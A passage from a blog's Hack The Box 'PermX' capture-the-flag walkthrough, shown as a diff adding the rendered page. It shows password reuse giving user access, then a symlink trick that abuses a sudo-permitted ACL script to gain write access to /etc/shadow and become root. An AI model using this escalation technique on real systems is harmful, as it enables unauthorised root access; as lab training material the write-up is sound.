class="string">&quot;remember password&quot;</span> <span class="built_in">link</span> to the <span class="string">&quot;subscription to session&quot;</span> confirmation email</span><br><span class="line">//<span class="variable">$_configuration</span>[<span class="string">&#x27;email_template_subscription_to_session_confirmation_lost_password&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">www-data@permx:/var/www/chamilo$</span><br></pre></td></tr></table></figure></div>
+
+<p>And we do have a password: “03F6lY3uXAP2bkW8”</p>
+<p>Let’s try it out on our <code>mtz</code> user that we can find under <code>/home</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@permx:/home$ su mtz</span><br><span class="line">su mtz</span><br><span class="line">Password: 03F6lY3uXAP2bkW8</span><br><span class="line"></span><br><span class="line">mtz@permx:/home$ <span class="built_in">cd</span> mtz</span><br><span class="line"><span class="built_in">cd</span> mtz</span><br><span class="line">mtz@permx:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">ed62845cbeaa21******************</span><br><span class="line">mtz@permx:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in and have our user.txt flag!</p>
+<h3 id="Privilege-Escalation-to-root"><a href="#Privilege-Escalation-to-root" class="headerlink" title="Privilege Escalation to root -"></a>Privilege Escalation to root -</h3><p>Checking what we can run as sudo with mtz:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mtz@permx:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> mtz on permx:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User mtz may run the following commands on permx:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /opt/acl.sh</span><br><span class="line">mtz@permx:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we can run a <code>/opt/acl.sh</code> script. Checking its’ contents:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mtz@permx:~$ <span class="built_in">cat</span> /opt/acl.sh</span><br><span class="line"><span class="built_in">cat</span> /opt/acl.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 3 ]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Usage: <span class="variable">$0</span> user perm file&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">user=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">perm=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">target=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$target</span>&quot;</span> != /home/mtz/* || <span class="string">&quot;<span class="variable">$target</span>&quot;</span> == *..* ]]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Access denied.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the path is a file</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Target must be a file.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">/usr/bin/sudo /usr/bin/setfacl -m u:<span class="string">&quot;<span class="variable">$user</span>&quot;</span>:<span class="string">&quot;<span class="variable">$perm</span>&quot;</span> <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br><span class="line">mtz@permx:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>Analyzing the script, it basically manages filespermissions using ACLs (access control lists) in a controlled way. It will “securely” assign files permissions to specific users on files located withing <code>/home/mtz</code> folder.<br>What we can do is symlink the <code>/etc/shadow</code> file to our directory, modify the root password hash and then access it. Lessdoit:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mtz@permx:~$ <span class="built_in">cd</span> /home/mtz</span><br><span class="line">mtz@permx:~$ <span class="built_in">ln</span> -s / root</span><br><span class="line">mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow</span><br><span class="line">mtz@permx:~$ nano /etc/shadow</span><br><span class="line">mtz@permx:~$ su root</span><br><span class="line">Password:</span><br><span class="line">root@permx:/home/mtz<span class="comment"># cat /root/root.txt</span></span><br><span class="line">5d0e617b7c5ac2******************</span><br><span class="line">root@permx:/home/mtz<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for this box! Hope you enjoyed it &lt;3<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: PermX</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-11-01 15:52:28</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-01 17:30:27
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/11/01/Hackthebox-PermX/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/25/Hackthebox-Mist/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Mist</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: PermX</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-lms-permx-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;lms.permx.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root"><span class="nav-text">Privilege Escalation to root -</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
